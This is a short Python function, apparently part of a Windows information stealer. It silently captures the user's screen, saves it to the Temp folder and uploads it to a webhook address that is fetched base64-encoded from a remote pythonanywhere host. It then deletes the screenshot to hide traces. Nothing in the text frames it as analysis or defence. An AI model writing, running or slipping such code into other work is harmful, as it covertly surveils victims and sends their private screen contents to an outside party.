# import os.path, requests, os
# from PIL import ImageGrab
# import base64

def sikrinsat():
    user = os.path.expanduser("~")

    hook = base64.b64decode(requests.get("https://mehmetaliii.pythonanywhere.com/webzuhurt").text).decode()

    captura = ImageGrab.grab()
    captura.save(user+"\\AppData\\Local\\Temp\\ss.png")

    file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
    r = requests.post(hook, files=file)
    try:
     os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
    except:
        pass